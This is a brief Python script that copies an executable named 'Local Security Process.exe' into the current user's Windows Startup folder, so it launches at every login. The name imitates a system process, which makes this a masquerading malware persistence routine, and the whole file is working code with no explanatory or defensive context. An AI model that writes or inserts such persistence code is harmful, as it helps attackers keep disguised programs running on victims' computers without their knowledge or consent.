import getpass
import os
import shutil

username = getpass.getuser()

src = os.getcwd() + "\Local Security Process.exe"
dest = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
shutil.copy(src, dest)